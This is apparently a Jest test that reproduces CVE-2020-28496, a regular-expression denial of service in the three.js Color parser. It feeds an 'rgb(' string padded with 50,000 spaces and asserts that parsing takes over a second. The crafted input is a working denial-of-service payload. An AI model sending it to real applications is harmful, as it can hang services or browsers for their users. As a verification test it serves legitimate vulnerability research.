//https://github.com/yetingli/PoCs/blob/main/CVE-2020-28496/CVE-2020-28496.js
test("ReDos in three", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const three = require('three')


    let attack_str="rgb("+genstr(50000," ") + "";
    let t =measureTime(function () {
        var Color = three.Color

        new Color(attack_str)

    });
    
    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});